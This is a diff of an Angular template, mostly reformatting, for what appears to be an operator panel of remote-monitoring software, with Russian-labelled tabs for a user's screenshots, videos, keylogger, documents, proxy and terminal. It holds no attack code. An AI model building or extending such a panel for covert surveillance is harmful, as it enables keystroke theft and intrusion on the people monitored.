@@ -1,139 +1,107 @@
 <div class="row">
-  <div class="col-3 search">
-    <nb-card class="search-card">
-      <nb-card-header>
-        <nb-form-field>
-          <nb-icon nbPrefix icon="search-outline" pack="eva"></nb-icon>
-          <input
-            fieldSize="large"
-            placeholder="Large"
-            fullWidth
-            type="text"
-            nbInput
-            shape="round"
-            placeholder="Поиск"
-          />
-        </nb-form-field>
-      </nb-card-header>
-      <nb-card-body>
-        <nb-select
-          size="tiny"
-          nbPrefix
-          icon="search-outline"
-          fullWidth
-          placeholder="Специальность"
-        >
-          <nb-icon  *ngIf="server.allusers" nbPrefix icon="search-outline" pack="eva"></nb-icon>
-            <nb-option  *ngFor="let user of server.allusers;let index = index " value="index">{{user.role}}</nb-option>
+    <div class="col-3 search">
+        <nb-card class="search-card">
+            <nb-card-header>
+                <nb-form-field>
+                    <nb-icon nbPrefix icon="search-outline" pack="eva"></nb-icon>
+                    <input fieldSize="large" placeholder="Large" fullWidth type="text" nbInput shape="round" placeholder="Поиск" />
+                </nb-form-field>
+            </nb-card-header>
+            <nb-card-body>
+                <nb-select size="tiny" nbPrefix icon="search-outline" fullWidth placeholder="Специальность">
+                    <nb-icon *ngIf="server.allusers" nbPrefix icon="search-outline" pack="eva"></nb-icon>
+                    <nb-option *ngFor="let user of server.allusers;let index = index " value="index">{{user.role}}</nb-option>
 
-        </nb-select>
+                </nb-select>
 
 
-          <nb-accordion *ngIf="server.allusers" multi>
-            <nb-accordion-item  *ngFor="let user of server.allusers">
-                <nb-accordion-item-header style="justify-content: space-between;">
-                  <nb-user
-                  (click)="GetUserToRoute(user.uuid)"
-                    badgeText="○"
-                    size="giant"
-                    badgeStatus="success"
-                    badgePosition="bottom right"
-                    [name]="user.first_name"
-                    [title]="user.role"
-                    [picture]= " server.HOST + user.photo"
+                <nb-accordion *ngIf="server.allusers" multi>
+                    <nb-accordion-item *ngFor="let user of server.allusers">
+                        <nb-accordion-item-header style="justify-content: space-between;">
+                            <nb-user (click)="GetUserToRoute(user.uuid)" badgeText="☻" size="giant" badgeStatus="success" badgePosition="bottom right" [name]="user.first_name" [title]="user.role" [picture]=" server.HOST + user.photo">
+                            </nb-user>
+                            <div style="padding-right: 20px;">
+                                <nb-icon status="warning" icon="star" pack="eva"></nb-icon>
+                            </div>
 
-                  >
-                  </nb-user>
-                  <div style="padding-right: 20px;">
-                    <nb-icon   status="warning" icon="star" pack="eva"></nb-icon>
-                  </div>
+                        </nb-accordion-item-header>
+                        <nb-accordion-item-body>
 
-                </nb-accordion-item-header>
-                <nb-accordion-item-body>
+                            <nb-stepper orientation="vertical">
+                                <nb-step label="mew">
+                                </nb-step>
+                                <nb-step label="mew 2">
+                                </nb-step>
+                                <nb-step label="mew 3">
+                                </nb-step>
+                                <nb-step label="mew 4">
+                                </nb-step>
+                            </nb-stepper>
+                        </nb-accordion-item-body>
 
-                  <nb-stepper orientation="vertical">
-                    <nb-step label="mew">
-                    </nb-step>
-                    <nb-step label="mew 2">
-                    </nb-step>
-                    <nb-step label="mew 3">
-                    </nb-step>
-                    <nb-step label="mew 4">
-                    </nb-step>
-                  </nb-stepper>
-                </nb-accordion-item-body>
+                    </nb-accordion-item>
+                </nb-accordion>
 
-            </nb-accordion-item>
-          </nb-accordion>
+            </nb-card-body>
+            <nb-card-footer>
+                <p class="styles_logoTitle__1Kvzk">
+                    <b>+ добавить избранных пользователей</b>
+                </p>
+            </nb-card-footer>
+        </nb-card>
+    </div>
+    <div class="col-9 content">
+        <nb-card class="content-card">
+            <nb-card-header fixed>
+                <div style="display: grid; grid-template-columns: repeat(7, 1fr); justify-items: center;">
 
-      </nb-card-body>
-      <nb-card-footer>
-        <p class="styles_logoTitle__1Kvzk">
-          <b>+ добавить избранных пользователей</b>
-        </p>
-      </nb-card-footer>
-    </nb-card>
-  </div>
-  <div class="col-9 content">
-    <nb-card class="content-card">
-      <nb-card-header fixed>
-        <div
-          style="
-            display: grid;
-            grid-template-columns: repeat(7, 1fr);
-            justify-items: center;
-          "
-        >
-          <a style="text-decoration: none;" routerLink="/pages/users/downloads">
-            <div>
-              <img src="../../../assets/images/user-actions/31996.svg" />
-              <p>Загрузки</p>
-            </div>
-          </a>
-          <a
-            style="text-decoration: none;"
-            routerLink="/pages/users/screenshots"
-          >
-            <div>
-              <img src="../../../assets/images/user-actions/31997.svg" />
-              <p>Скриншоты</p>
-            </div>
-          </a>
-          <a style="text-decoration: none;" routerLink="/pages/users/videos">
-            <div>
-              <img src="../../../assets/images/user-actions/32001.svg" />
-              <p>Видео</p>
-            </div>
-          </a>
-          <a style="text-decoration: none;" routerLink="/pages/users/keylog">
-            <div>
-              <img src="../../../assets/images/user-actions/31995.svg" />
-              <p>Кейлоггер</p>
-            </div>
-          </a>
-          <a style="text-decoration: none;" routerLink="/pages/users/documents">
-            <div>
-              <img src="../../../assets/images/user-actions/31998.svg" />
-              <p>Документы</p>
-            </div>
-          </a>
-          <a style="text-decoration: none;" routerLink="/pages/users/proxy">
-            <div>
-              <img src="../../../assets/images/user-actions/31999.svg" />
-              <p>Proxy<br />сервер</p>
-            </div>
-          </a>
-          <a style="text-decoration: none;" routerLink="/pages/users/terminal">
-            <div>
-              <img src="../../../assets/images/user-actions/32000.svg" />
-              <p>Терминал</p>
-            </div>
-          </a>
-        </div>
-      </nb-card-header>
-      <nb-card-body>
-        <router-outlet></router-outlet>
-      </nb-card-body>
-    </nb-card>
-  </div>
+                    <a style="text-decoration: none;" routerLink="/pages/users/downloads">
+                        <div>
+                            <img src="../../../assets/images/user-actions/31996.svg" />
+                            <p>Загрузки</p>
+                        </div>
+                    </a>
+                    <a style="text-decoration: none;" routerLink="/pages/users/screenshots">
+                        <div>
+                            <img src="../../../assets/images/user-actions/31997.svg" />
+                            <p>Скриншоты</p>
+                        </div>
+                    </a>
+                    <a style="text-decoration: none;" routerLink="/pages/users/videos">
+                        <div>
+                            <img src="../../../assets/images/user-actions/32001.svg" />
+                            <p>Видео</p>
+                        </div>
+                    </a>
+                    <a style="text-decoration: none;" routerLink="/pages/users/keylog">
+                        <div>
+                            <img src="../../../assets/images/user-actions/31995.svg" />
+                            <p>Кейлоггер</p>
+                        </div>
+                    </a>
+                    <a style="text-decoration: none;" routerLink="/pages/users/documents">
+                        <div>
+                            <img src="../../../assets/images/user-actions/31998.svg" />
+                            <p>Документы</p>
+                        </div>
+                    </a>
+                    <a style="text-decoration: none;" routerLink="/pages/users/proxy">
+                        <div>
+                            <img src="../../../assets/images/user-actions/31999.svg" />
+                            <p>Proxy<br />сервер</p>
+                        </div>
+                    </a>
+                    <a style="text-decoration: none;" routerLink="/pages/users/terminal">
+                        <div>
+                            <img src="../../../assets/images/user-actions/32000.svg" />
+                            <p>Терминал</p>
+                        </div>
+                    </a>
+                </div>
+            </nb-card-header>
+            <nb-card-body>
+                <router-outlet></router-outlet>
+            </nb-card-body>
+        </nb-card>
+    </div>
 </div>
